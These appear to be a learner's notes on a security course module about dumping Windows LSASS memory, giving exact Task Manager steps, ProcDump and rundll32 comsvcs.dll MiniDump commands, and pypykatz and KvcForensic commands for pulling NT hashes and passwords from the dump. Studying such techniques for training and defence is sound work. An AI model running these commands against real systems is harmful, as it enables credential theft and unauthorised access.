# URL
https://www.hacksmarter.org/courses/4261d023-900a-443b-8d10-cdc2ee2dddb5
# Concept
* dumping LSASS to get NT hashes and possibly passwords
# Method of solve
* this learning module teaches us 3 different methods of dumping out LSASS memory, which can be used to obtain NT hashes for users or potentially cleartext passwords
## Getting the LSASS Dump
### Using Task Manager
* this requires we have either RDP or physical access to the server in question
* open Task Manger as either the Admin user or the NT Authority / SYSTEM user
* click on the Details tab
* locate `lsass.exe`
* right-click the process
* select `Create memory dump file`
### Using ProcDump
* ProcDump is not installed on Windows machines by default
* we will need to download it from this page:
```
https://learn.microsoft.com/en-us/sysinternals/downloads/procdump
```
* the command to run from the CLI to obtain the memory dump from ProcDump is:
```
procdump.exe -accepteula -ma lsass.exe C:\lsass.dmp
```
### Using Runddl32
* this a LOLbin (living off the land binary) which is native to all (modern) Windows systems
* before we run `rundll32.exe`, we need to obtain the PID of the LSASS process:
```
tasklist | findstr lsass
```
* we can run the following command to dump LSASS:
```
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 644 C:\lsass.dmp full
```
## Analyzing the LSASS Dump
### Pypykatz
* Pypykatz is not installed on Kali Linux by default, but we can install it easily by just typing in `pypykatz` into the terminal, then it will prompt if we want to install it
* the Pypykatz command syntax to analyze a LSASS dump is:
```
pypykatz lsa minidump lsass.dmp
```
* it's probably good practice to output this to a file, for future reference
* to look through the output for a specific user, we'd use a command something like this:
```
cat pypykatz_lsass.txt | grep "Administrator" -C 20
```
### KvcForensic
* this is another tool that can be used to analyze LSASS dumps
* this might be better to use than Pypykatz for specific versions of Windows (Windows Server 2025)
* we can download the latest release for Linux from this website:
```
https://github.com/wesmar/KvcForensic/releases/tag/latest
```
* then we can use the following command to parse the LSASS:
```
./KvcForensic_static --analyze-dump \
    --input lsass.dmp \
    --output result.txt \
    --templates KvcForensic.json \
    --format both --full --reveal-secrets
```


